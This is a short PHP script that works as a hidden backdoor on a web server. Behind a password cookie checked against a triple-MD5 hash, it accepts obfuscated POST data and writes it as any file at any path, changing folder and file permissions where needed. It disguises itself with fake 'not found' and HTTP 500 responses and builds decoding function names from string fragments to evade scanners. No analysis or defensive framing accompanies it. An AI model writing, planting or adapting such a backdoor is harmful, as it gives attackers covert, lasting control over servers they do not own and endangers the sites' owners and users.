<?php
function endsWith($FullStr, $needle) {
	$StrLen = strlen($needle);
	$FullStrEnd = substr($FullStr, strlen($FullStr) - $StrLen);
	return $FullStrEnd == $needle;
}
function folder_of_file($p1){
	if(!stristr($p1, '/')){
		return realpath('./');
	}
	if(strpos($p1, '//') !== false){
		$p1 = str_replace('//','/',$p1);
	}
	if(endsWith($p1, '/') == true){
		$p1 = substr_replace($p1 ,'', -1);
	}
	$p2 = '';
	$ar = explode('/', $p1);
	for($i=1; $i < count($ar) - 1; $i++){
		$p2 .= '/'.$ar[$i];
	}
	if($p1[0] == '.' && $p1[1] == '/'){
		$p2 = './'.$p2;
	}
	if($p1[0] == '.' && $p1[1] == '.'){
		$p2 = '../'.$p2;
	}
	if(strpos($p2, '//') !== false){
		$p2 = str_replace('//','/',$p2);
	}
	return trim($p2);
}
function save($path, $source){
	$os = strtolower(substr(PHP_OS, 0, 3));
	$folder_P = folder_of_file($path);
	if (!is_writable($folder_P) && $os != "win"){ chmod($folder_P, 0755); }
	if (file_exists($path) && is_file($path) && !is_writable($path) && $os != "win"){ chmod($path, 0644); }
	if(function_exists('file_put_contents')){
		$saV = file_put_contents($path, $source);
	}else{
		$saV = fwrite(fopen($path, 'w'), $source);
	}
	return $saV;
}
if(!empty($_GET['action'])){
	die('Sorry the page you were looking for could not be found.');
}
if (md5(md5(md5($_COOKIE['pwd']))) !== '0d4f69bb38f2354a6d896d6a222a4bf5' || empty($_POST['name']) || empty($_POST['age'])){
	header('HTTP/1.1 500 Internal Server Error', true, 500);
	exit(0);
}
$b = 'ba'.'s'.'e'.'6'.'4_'.'de'.'co'.'de';$srv = 'str'.'rev';$rot = 'str'.'_'.'rot'.'13';
save(trim($_POST['name']), gzuncompress($b($srv($rot(trim($_POST['age']))))));
echo '<html><center>./Done</center></html>';
?>